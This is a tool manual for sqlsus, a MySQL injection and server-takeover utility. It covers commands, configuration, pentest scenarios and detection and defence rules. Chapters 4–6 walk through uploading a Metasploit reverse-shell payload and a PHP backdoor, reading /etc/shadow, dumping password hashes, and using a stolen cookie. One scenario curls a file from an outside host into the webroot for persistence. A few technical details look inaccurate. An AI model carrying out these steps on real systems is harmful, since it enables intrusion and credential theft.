---
tool_name: "sqlsus"
display_name: "sqlsus"
mitre_tactic: "initial_access"
mitre_tactic_id: "TA0001"
mitre_subcategory: "sql_injection"
install_command: "sudo apt install sqlsus"
version: "0.7.2"
github_repo: "https://gitlab.com/kalilinux/packages/sqlsus"
kali_tools_page: "https://www.kali.org/tools/sqlsus/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["web", "sql-injection", "mysql", "exploitation", "database"]
related_tools: ["sqlmap", "sqlninja", "jsql", "bbqsql"]
---

# sqlsus

## Chapter 1: Introduction & Overview

### What is sqlsus?

sqlsus is an open-source MySQL injection and takeover tool written in Perl. It provides a command-line interface for extracting database structures, executing arbitrary SQL queries, downloading files from web servers, crawling websites for writable directories, uploading backdoors, and cloning entire databases. When relevant, sqlsus outputs results in a format mimicking a MySQL console.

### History & Background

- **Created:** 2008 by Jeremy Ruffet (sativouf)
- **Maintained:** Jeremy Ruffet
- **License:** GNU General Public License v3
- **Purpose:** MySQL injection detection, exploitation, and server takeover

sqlsus differentiates itself from sqlmap through its optimization for MySQL-specific injection scenarios. It uses stacked subqueries and a multithreaded blind injection algorithm to maximize data extraction per server request, making it one of the fastest MySQL database dumpers available.

### When to Use This Tool

- **MySQL database testing:** Identify and exploit MySQL injection vulnerabilities
- **Database extraction:** Dump entire databases efficiently
- **Server takeover:** Upload PHP backdoors through injection points
- **Penetration testing:** Assess web application security against SQL injection
- **CTF challenges:** Solve MySQL injection challenges
- **Security audits:** Evaluate database access controls

### When NOT to Use This Tool

- Without explicit written authorization from the application owner
- On production systems without careful planning and rollback procedures
- Against non-MySQL databases (sqlsus is MySQL-specific)
- For malicious purposes or unauthorized access

### Legal and Ethical Considerations

- **Written authorization** required before any testing
- **Scope definition** must be clear and documented
- **Backdoor removal** after testing is mandatory
- **Data handling** must comply with applicable regulations
- **Responsible disclosure** of discovered vulnerabilities
- **Documentation** of all activities for audit purposes

### Key Concepts

- **Inband Injection:** Data returned directly in HTTP response using UNION queries
- **Blind Injection:** Data inferred from boolean or timing responses
- **Stacked Subqueries:** Multiple queries executed in a single request
- **Server Takeover:** Uploading web shells through FILE privilege abuse
- **SQLite Backend:** Local storage of extracted data for offline analysis

### MySQL Injection Types Supported

| Type | Description | When to Use |
|------|-------------|-------------|
| **Inband (UNION)** | Results returned in HTML response | When UNION SELECT is possible |
| **Boolean-based blind** | Compare page content based on true/false | When no direct output visible |
| **Time-based blind** | Use SLEEP() to infer data | When boolean comparison unreliable |
| **Error-based** | Extract data from MySQL error messages | When error display is enabled |

### sqlsus vs sqlmap Comparison

| Feature | sqlsus | sqlmap |
|---------|--------|--------|
| **Database Support** | MySQL only | Multiple databases |
| **Speed** | Optimized for MySQL | General-purpose |
| **Inband Efficiency** | Stacked subqueries | Standard UNION |
| **Blind Algorithm** | Regex matching + binary search | Multiple techniques |
| **Backend** | SQLite | SQLite |
| **Ease of Use** | Config-file based | Command-line flags |
| **Backdoor Upload** | Built-in PHP backdoor | File write capability |

---

## Chapter 2: Installation & Setup

### System Requirements

- **Operating System:** Linux (designed for Linux, may work on others)
- **Perl:** 5.x or later
- **Disk Space:** ~1 MB for sqlsus + space for SQLite databases
- **Privileges:** User-level (some features require database FILE privilege)

### Perl Dependencies

- LWP::UserAgent
- DBD::SQLite
- HTML::LinkExtractor
- LWP::Protocol::socks (for SOCKS proxy support)
- Switch
- Term::ReadLine::GNU (recommended)

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install sqlsus
```

**Explanation:** Installs sqlsus and all Perl dependencies from Kali repositories.

#### Method 2: Manual Dependency Installation

```bash
sudo apt install libwww-perl libdbd-sqlite3-perl libhtml-linkextractor-perl libterm-readline-gnu-perl liblwp-protocol-socks-perl sqlite3 libswitch-perl
```

**Explanation:** Installs all required Perl modules manually.

#### Method 3: From Source

```bash
git clone https://gitlab.com/kalilinux/packages/sqlsus.git
cd sqlsus
chmod +x sqlsus
sudo cp sqlsus /usr/local/bin/
```

**Explanation:** Clones from GitLab and installs to system path.

### Configuration

sqlsus uses configuration files with a `.conf` extension:

- **Default config location:** Current working directory
- **Generated configs:** Created with `--genconf` flag
- **SQLite databases:** Stored in `data/` subdirectory

### Verification

```bash
sqlsus --version
```

**Output:**

```
sqlsus version 0.7.2
```

---

## Chapter 3: Basic Usage

### First Session

#### Generate Configuration File

```bash
sqlsus --genconf target.conf
```

**Explanation:** Creates a default configuration file with inline documentation.

#### Edit Configuration

```bash
nano target.conf
```

**Explanation:** Edit the configuration to match your target.

#### Start sqlsus

```bash
sqlsus target.conf
```

**Explanation:** Launches sqlsus with the specified configuration file.

#### Begin Injection Testing

```
sqlsus> start
```

**Explanation:** Initiates automatic injection detection and database enumeration.

### Essential Commands

#### Database Enumeration

```
sqlsus> get databases
```

**Explanation:** Lists all databases accessible through the injection point.

```
sqlsus> get tables <database_name>
```

**Explanation:** Lists all tables in the specified database.

```
sqlsus> get columns <database_name> <table_name>
```

**Explanation:** Lists all columns in the specified table.

```
sqlsus> get count <database_name> <table_name>
```

**Explanation:** Returns row count for the specified table.

#### Data Extraction

```
sqlsus> get data <database_name> <table_name> <column_name>
```

**Explanation:** Extracts all values from the specified column.

```
sqlsus> select <database_name> <query>
```

**Explanation:** Executes arbitrary SQL SELECT query.

#### Server Operations

```
sqlsus> download <remote_file_path>
```

**Explanation:** Downloads a file from the web server.

```
sqlsus> upload <local_file> <remote_path>
```

**Explanation:** Uploads a file to the web server (requires FILE privilege).

```
sqlsus> crawl <depth>
```

**Explanation:** Crawls the website to discover directories and writable paths.

#### Session Management

```
sqlsus> set <variable> <value>
```

**Explanation:** Sets a configuration variable during runtime.

```
sqlsus> genconf <filename>
```

**Explanation:** Saves current configuration to a new file.

```
sqlsus> help
```

**Explanation:** Displays available commands.

### Complete Command Reference

#### Database Enumeration Commands

| Command | Description | Example |
|---------|-------------|---------|
| `get databases` | List all databases | `get databases` |
| `get tables <db>` | List tables in database | `get tables wordpress` |
| `get columns <db> <table>` | List columns in table | `get columns wordpress users` |
| `get count <db> <table>` | Count rows in table | `get count wordpress users` |
| `get privileges` | List MySQL privileges | `get privileges` |
| `use <db>` | Switch to database | `use wordpress` |

#### Data Extraction Commands

| Command | Description | Example |
|---------|-------------|---------|
| `get data <db> <table> <col>` | Extract column data | `get data wordpress users password` |
| `select <db> <query>` | Execute SELECT query | `select wordpress SELECT @@version` |
| `clone` | Clone entire database | `clone` |

#### Server Access Commands

| Command | Description | Example |
|---------|-------------|---------|
| `download <path>` | Download remote file | `download /etc/passwd` |
| `upload <local> <remote>` | Upload file to server | `upload shell.php /var/www/` |
| `crawl <depth>` | Crawl website | `crawl 3` |
| `backdoor` | Upload PHP backdoor | `backdoor` |

#### Configuration Commands

| Command | Description | Example |
|---------|-------------|---------|
| `set <var> <val>` | Set variable | `set cookie "PHPSESSID=abc123"` |
| `show` | Show current config | `show` |
| `genconf <file>` | Save config | `genconf saved.conf` |
| `help` | Show commands | `help` |
| `help <command>` | Command help | `help get data` |

#### Session Commands

| Command | Description | Example |
|---------|-------------|---------|
| `start` | Begin injection test | `start` |
| `exit` | Exit sqlsus | `exit` |
| `Ctrl-C` | Break current command | (keyboard interrupt) |

---

## Chapter 4: Intermediate Usage

### Configuration File Deep Dive

#### Configuration File Structure

```
package conf;

# Target URL
$url = "http://target.example.com/index.php";

# Injection parameter
$injection_string = "1";

# HTTP method
$method = "GET";

# Cookies
$cookie = "";

# Proxy settings
$proxy = "";
$proxy_type = "http";

# Threads for blind injection
$threads = 10;

# Inband settings
$max_subqueries = 50;
$max_sendable = 10000;

# Blind settings
$default_range = "ascii,32,127";
$timeout = 30;
```

#### Minimal Configuration File

```
package conf;

$url = "http://target.example.com/page.php?id=1";
$injection_string = "1";
```

**Explanation:** Minimal config specifying only the target URL.

#### Configuration with Authentication

```
package conf;

$url = "http://target.example.com/admin/index.php";
$injection_string = "1";
$method = "POST";
$post_data = "username=admin&password=test123";
$cookie = "PHPSESSID=abc123def456";
```

**Explanation:** Configuration for authenticated testing with POST parameters.

#### Configuration with Proxy

```
package conf;

$url = "http://target.example.com/index.php";
$injection_string = "1";
$proxy = "http://127.0.0.1:8080";
$proxy_type = "http";
```

**Explanation:** Routes all requests through Burp Suite proxy.

#### Configuration with SOCKS Proxy

```
package conf;

$url = "http://target.example.com/index.php";
$injection_string = "1";
$proxy = "127.0.0.1:9050";
$proxy_type = "socks";
```

**Explanation:** Routes requests through Tor SOCKS proxy.

### Inband Injection

#### Optimizing Inband Extraction

```
sqlsus> set max_subqueries 100
sqlsus> set max_sendable 50000
sqlsus> start
```

**Explanation:** Increases subquery and data limits for faster inband extraction.

#### Auto-Configuration for Inband

```
sqlsus> autoconf subqueries
sqlsus> autoconf sendable
sqlsus> start
```

**Explanation:** Automatically determines optimal subquery and sendable values.

#### Extracting Data Inband

```
sqlsus> get databases
sqlsus> get tables mydb
sqlsus> get columns mydb users
sqlsus> get data mydb users username
sqlsus> get data mydb users password
```

**Explanation:** Sequential extraction of database structure and data.

### Blind Injection

#### Optimizing Blind Extraction

```
sqlsus> set threads 20
sqlsus> set default_range "ascii,32,127"
sqlsus> start
```

**Explanation:** Increases thread count and defines character range for blind extraction.

#### Blind Extraction Process

```
sqlsus> start
sqlsus> get databases
sqlsus> get tables mydb
sqlsus> get columns mydb users
sqlsus> get data mydb users password
```

**Explanation:** Blind extraction follows same commands; sqlsus handles the injection technique automatically.

### Scripting & Automation

#### Batch Mode Execution

```bash
sqlsus target.conf -e 'start;get databases;get tables mydb;get columns mydb users;get data mydb users password'
```

**Explanation:** Executes multiple commands without entering interactive mode.

#### Bash Scripting

```bash
#!/bin/bash
CONFIG="target.conf"

# Run sqlsus with multiple commands
sqlsus $CONFIG -e 'start;get databases;get tables mydb;get data mydb users password' > results.txt

echo "[+] Extraction complete. Results saved to results.txt"
```

**Explanation:** Automates sqlsus execution with command chaining.

#### Python Scripting

```python
#!/usr/bin/env python3
import subprocess

config = "target.conf"
commands = "start;get databases;get tables mydb;get data mydb users password"

cmd = f"sqlsus {config} -e '{commands}'"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(result.stdout)
```

**Explanation:** Python wrapper for automated sqlsus execution.

### Combining with Other Tools

#### With Burp Suite

```bash
# 1. Capture request in Burp Suite
# 2. Configure sqlsus to use Burp proxy
sqlsus --genconf target.conf
# Edit target.conf to include proxy settings
sqlsus target.conf
```

**Explanation:** Routes sqlsus traffic through Burp for inspection and manipulation.

#### With sqlmap

```bash
# Use sqlsus for MySQL-specific extraction
sqlsus target.conf -e 'start;get databases'

# Use sqlmap for broader testing
sqlmap -u "http://target.example.com/?id=1" --dbs
```

**Explanation:** Combines sqlsus MySQL optimization with sqlmap's multi-database support.

#### With Metasploit

```bash
# Generate payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Upload via sqlsus
sqlsus target.conf
sqlsus> upload shell.php /var/www/html/
```

**Explanation:** Uses sqlsus file upload capability with Metasploit payloads.

### Advanced Configurations

#### Custom Injection String

```
package conf;

$url = "http://target.example.com/page.php?id=1";
$injection_string = "1 AND 1=1";
```

**Explanation:** Custom injection string for specific testing scenarios.

#### Multiple Injection Points

```
# Test each parameter separately
sqlsus target.conf -e 'set injection_string "1";start'
sqlsus target.conf -e 'set injection_string "test";set method POST;set post_data "field=test";start'
```

**Explanation:** Tests different injection points in separate sessions.

### Performance Optimization

#### Thread Configuration

```
sqlsus> set threads 50
```

**Explanation:** Increases parallel processing for faster blind extraction.

#### Connection Tuning

```
sqlsus> set timeout 60
sqlsus> set retries 3
```

**Explanation:** Adjusts connection timeout and retry settings for slow targets.

---

## Chapter 5: Advanced Usage

### Server Takeover

#### Prerequisites for Takeover

- Database user must have FILE privilege
- Injection must allow quotes (quoted injection)
- Must know document_root path
- At least one writable directory on web server

#### Step 1: Verify FILE Privilege

```
sqlsus> get privileges
```

**Explanation:** Checks if FILE privilege is available.

#### Step 2: Find Document Root

```
sqlsus> select mydb SELECT @@datadir
sqlsus> download /etc/apache2/apache2.conf
```

**Explanation:** Determines web server document root path.

#### Step 3: Crawl for Writable Directories

```
sqlsus> crawl 3
```

**Explanation:** Discovers directories and checks for write permissions.

#### Step 4: Upload Backdoor

```
sqlsus> backdoor
```

**Explanation:** Uploads PHP backdoor to discovered writable directory.

#### Step 5: Access Backdoor

```
# Browser access
http://target.example.com/backdoor.php

# Or use the controller
sqlsus> controller
```

**Explanation:** Accesses the uploaded backdoor for command execution.

### Backdoor Controller

#### Command Execution

```
sqlsus> controller
controller> cmd whoami
controller> cmd cat /etc/passwd
controller> sql SELECT * FROM users
```

**Explanation:** Executes system commands and SQL queries through the backdoor.

#### PHP Command Execution

```
controller> php system('ls -la');
controller> php file_get_contents('/etc/shadow');
```

**Explanation:** Executes PHP code through the backdoor.

### Advanced Database Operations

#### Database Cloning

```
sqlsus> clone
```

**Explanation:** Clones entire database structure and data to local SQLite database.

#### Local SQLite Access

```bash
sqlite3 data/sqlsus.db

# View tables
.tables

# Query extracted data
SELECT * FROM queries;
SELECT * FROM tables;
SELECT * FROM databases;
```

**Explanation:** Direct access to extracted data via SQLite command line.

#### Session Resumption

```
# Start session
sqlsus target.conf
sqlsus> start
sqlsus> get databases

# Resume later
sqlsus target.conf
sqlsus> get tables mydb  # Continues from previous session
```

**Explanation:** sqlsus caches results in SQLite, allowing session resumption.

### Advanced Injection Techniques

#### Time-Based Blind Optimization

```
sqlsus> set threads 30
sqlsus> set default_range "ascii,97,122"
sqlsus> start
```

**Explanation:** Optimizes time-based blind extraction with character range.

#### Error-Based Extraction

```
sqlsus> select mydb SELECT extractvalue(1,concat(0x7e,(SELECT version()),0x7e))
```

**Explanation:** Manual error-based extraction for specific scenarios.

### Integration in Pentest Workflow

#### Phase 1: Reconnaissance

```bash
# Spider target
sqlsus target.conf
sqlsus> crawl 5

# Identify injection points
sqlsus> start
```

**Explanation:** Discovers site structure and identifies injection points.

#### Phase 2: Database Extraction

```bash
sqlsus> get databases
sqlsus> get tables mydb
sqlsus> get columns mydb users
sqlsus> get data mydb users password
```

**Explanation:** Systematic database structure and data extraction.

#### Phase 3: Server Access

```bash
sqlsus> get privileges
sqlsus> backdoor
# Access backdoor
controller> cmd cat /etc/passwd
```

**Explanation:** Escalates to server access through backdoor upload.

#### Phase 4: Post-Exploitation

```bash
controller> cmd cat /etc/shadow
controller> sql SELECT user,authentication_string FROM mysql.user
controller> cmd find / -name "*.conf" -readable 2>/dev/null
```

**Explanation:** Extracts sensitive data and searches for additional credentials.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Extract flag from MySQL database

**Steps:**

```bash
# 1. Generate and edit configuration
sqlsus --genconf target.conf
# Edit target.conf with target URL

# 2. Start extraction
sqlsus target.conf
sqlsus> start

# 3. Enumerate database
sqlsus> get databases
sqlsus> get tables ctf_db
sqlsus> get columns ctf_db flags

# 4. Extract flag
sqlsus> get data ctf_db flags flag_value
```

### Scenario 2: Penetration Test - Web Application

**Objective:** Assess SQL injection risk in client application

**Steps:**

```bash
# 1. Initial reconnaissance
sqlsus target.conf
sqlsus> crawl 3

# 2. Test injection points
sqlsus> start

# 3. Extract database structure
sqlsus> get databases
sqlsus> get tables production_db

# 4. Identify sensitive tables
sqlsus> get columns production_db users
sqlsus> get columns production_db credit_cards

# 5. Extract sample data
sqlsus> get data production_db users username
sqlsus> get data production_db users password

# 6. Document findings
sqlsus> genconf findings.conf
```

### Scenario 3: Red Team Operation

**Objective:** Compromise web server through SQL injection

**Steps:**

```bash
# 1. Configure for target
sqlsus target.conf
sqlsus> set cookie "session=stolen_cookie_value"

# 2. Verify injection
sqlsus> start

# 3. Check privileges
sqlsus> get privileges

# 4. Find document root
sqlsus> download /etc/apache2/sites-enabled/000-default.conf

# 5. Crawl for writable directories
sqlsus> crawl 5

# 6. Upload backdoor
sqlsus> backdoor

# 7. Access backdoor
controller> cmd id
controller> cmd cat /etc/passwd
controller> cmd find /var/www -name "*.php" -writable

# 8. Establish persistence
controller> cmd curl http://192.168.1.100/persistent.php -o /var/www/html/backup.php
```

### Scenario 4: Database Migration Assessment

**Objective:** Document existing database structure

**Steps:**

```bash
# 1. Connect to target
sqlsus target.conf
sqlsus> start

# 2. Enumerate all databases
sqlsus> get databases

# 3. Document each database
sqlsus> get tables db1
sqlsus> get tables db2
sqlsus> get tables db3

# 4. Get row counts
sqlsus> get count db1 users
sqlsus> get count db2 orders

# 5. Clone for offline analysis
sqlsus> clone

# 6. Access local copy
sqlite3 data/sqlsus.db
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect sqlsus

#### Network Signatures

```
# SQL injection patterns in requests
GET /page.php?id=1' AND 1=1--
GET /page.php?id=1' UNION SELECT
GET /page.php?id=1' OR '1'='1

# Crawling patterns
GET /robots.txt
GET /sitemap.xml
GET /.htaccess

# File access attempts
GET /etc/passwd
POST /backdoor.php
```

#### Web Server Logs

```bash
# Detect sqlsus activity
grep -E "UNION|SELECT|DROP|INSERT|UPDATE|DELETE|' OR|' AND" /var/log/apache2/access.log

# Detect crawling
grep -E "robots.txt|sitemap.xml|\.htaccess" /var/log/apache2/access.log

# Detect backdoor access
grep -E "backdoor\.php|cmd=|shell=" /var/log/apache2/access.log
```

#### Database Logs

```bash
# Enable MySQL general log
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';

# Query for suspicious activity
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%';
SELECT * FROM mysql.general_log WHERE argument LIKE '%SELECT%INTO%OUTFILE%';
```

#### IDS/IPS Rules

```
# Snort rule for sqlsus patterns
alert http any any -> $HOME_NET any (msg:"SQL Injection - sqlsus"; 
  content:"UNION"; content:"SELECT"; sid:1000001;)

# Detect file upload attempts
alert mysql any any -> $HOME_NET any (msg:"MySQL INTO OUTFILE"; 
  content:"INTO OUTFILE"; sid:1000002;)
```

### Mitigation Strategies

#### Input Validation

```python
# Python input validation
import re

def validate_input(user_input):
    # Allow only alphanumeric characters
    if re.match(r'^[a-zA-Z0-9]+$', user_input):
        return True
    return False

# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**Explanation:** Validates input and uses parameterized queries.

#### Prepared Statements (PHP)

```php
// Vulnerable code
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Secure code - Prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

**Explanation:** Uses PDO prepared statements to prevent injection.

#### MySQL Privilege Restriction

```sql
-- Create limited user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';

-- Grant only necessary privileges
GRANT SELECT ON webapp_db.* TO 'webapp'@'localhost';

-- Revoke FILE privilege
REVOKE FILE ON *.* FROM 'webapp'@'localhost';

-- Apply changes
FLUSH PRIVILEGES;
```

**Explanation:** Limits database user privileges to prevent FILE abuse.

#### File System Security

```bash
# Remove write permissions
chmod -R 755 /var/www/html
chown -R www-data:www-data /var/www/html

# Disable PHP execution in upload directories
# Apache configuration
<Directory /var/www/html/uploads>
    php_flag engine off
</Directory>
```

**Explanation:** Restricts file system permissions to prevent backdoor uploads.

#### WAF Rules

```bash
# ModSecurity rules
SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "@rx (?i)(union|select|insert|update|delete|drop|alter|create|exec|execute)" \
  "id:1001,phase:2,block,msg:'SQL Injection Attempt'"

SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)(into\s+outfile|load_file|benchmark|sleep|waitfor)" \
  "id:1002,phase:2,block,msg:'MySQL Attack Pattern'"
```

**Explanation:** Web application firewall rules to block injection attempts.

#### Rate Limiting

```bash
# nginx rate limiting
limit_req_zone $binary_remote_addr zone=sql:10m rate=10r/s;

location / {
    limit_req zone=sql burst=20 nodelay;
}
```

**Explanation:** Limits request rate to slow automated extraction.

### Blue Team Response

1. **Monitor database logs** - Watch for unusual SELECT patterns
2. **Analyze web server logs** - Detect SQL injection attempts
3. **Review MySQL privileges** - Ensure minimal required permissions
4. **Check file integrity** - Monitor web directories for unauthorized files
5. **Implement WAF** - Deploy rules to block injection patterns
6. **Enable HTTPS** - Prevent credential interception
7. **Regular updates** - Patch MySQL and web application

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Can't connect to target"

**Cause:** Target unreachable or incorrect URL

**Solution:**

```bash
# Verify target is accessible
curl -I http://target.example.com

# Check configuration
cat target.conf | grep url

# Test with browser
firefox http://target.example.com
```

#### Error: "No injection found"

**Cause:** Target not vulnerable or incorrect injection string

**Solution:**

```bash
# Verify injection string manually
curl "http://target.example.com/page.php?id=1'"

# Try different injection strings
sqlsus target.conf
sqlsus> set injection_string "1 OR 1=1"
sqlsus> start
```

#### Error: "Module not found" / Missing dependencies

**Cause:** Perl modules not installed

**Solution:**

```bash
# Install all dependencies
sudo apt install libwww-perl libdbd-sqlite3-perl libhtml-linkextractor-perl libterm-readline-gnu-perl liblwp-protocol-socks-perl sqlite3 libswitch-perl

# Or reinstall sqlsus
sudo apt install --reinstall sqlsus
```

#### Error: "Terminal not in UTF-8"

**Cause:** Terminal encoding issue

**Solution:**

```bash
# Set UTF-8 encoding
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# Or configure terminal emulator
# Terminal > Preferences > Character Encoding > Unicode (UTF-8)
```

#### Error: "Permission denied on upload"

**Cause:** Database user lacks FILE privilege

**Solution:**

```bash
# Check privileges
sqlsus> get privileges

# If FILE privilege missing, focus on data extraction only
sqlsus> get databases
sqlsus> get data mydb users password
```

### Performance Optimization

#### Slow Blind Extraction

```bash
# Increase threads
sqlsus> set threads 30

# Optimize character range
sqlsus> set default_range "ascii,97,122"

# Reduce timeout for faster iteration
sqlsus> set timeout 10
```

#### Connection Timeouts

```bash
# Increase timeout
sqlsus> set timeout 120

# Add retry logic
sqlsus> set retries 5
```

### FAQ

**Q: Is sqlsus legal to use?**

A: Yes, sqlsus is a legitimate security testing tool. However, using it without authorization is illegal. Always obtain written permission before testing.

**Q: How do I update sqlsus?**

A: `sudo apt update && sudo apt upgrade sqlsus`

**Q: Can sqlsus test non-MySQL databases?**

A: No, sqlsus is MySQL-specific. For other databases, use sqlmap.

**Q: How do I resume a previous session?**

A: Simply run `sqlsus target.conf` again - sqlsus caches results in SQLite and resumes automatically.

**Q: What if FILE privilege is not available?**

A: sqlsus can still extract data through inband or blind injection. Server takeover requires FILE privilege.

**Q: How do I access the extracted data offline?**

A: Use sqlite3 to access the SQLite database: `sqlite3 data/sqlsus.db`

**Q: Can sqlsus bypass WAF?**

A: sqlsus does not include built-in WAF bypass techniques. Consider using sqlmap with tamper scripts for WAF bypass scenarios.

**Q: How do I generate a configuration file?**

A: Use `sqlsus --genconf my.cfg` to generate a default configuration with inline documentation.

---

## Resources

### Official Documentation

- [sqlsus Homepage](https://sqlsus.sourceforge.net/)
- [sqlsus Documentation](https://sqlsus.sourceforge.net/documentation.html)
- [Kali Linux Tools](https://www.kali.org/tools/sqlsus/)
- [GitLab Repository](https://gitlab.com/kalilinux/packages/sqlsus)

### Tutorials

- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

### Books

- "SQL Injection Attacks and Defense" by Justin Clarke
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Hacking: The Art of Exploitation" by Jon Erickson

### Related Tools

- **sqlmap:** Multi-database SQL injection tool
- **sqlninja:** SQL Server injection tool
- **jSQL:** Java-based SQL injection tool
- **bbqsql:** Blind SQL injection framework

### Practice Resources

- [DVWA](https://github.com/digininja/DVWA) - Damn Vulnerable Web Application
- [WebGoat](https://github.com/WebGoat/WebGoat) - OWASP WebGoat
- [HackTheBox](https://www.hackthebox.com/) - CTF platform
- [TryHackMe](https://tryhackme.com/) - Learning platform
- [VulnHub](https://www.vulnhub.com/) - Vulnerable VMs

### Certifications That Use sqlsus

- OSCP (Offensive Security Certified Professional)
- CEH (Certified Ethical Hacker)
- GPEN (GIAC Penetration Tester)
- PNPT (Practical Network Penetration Tester)
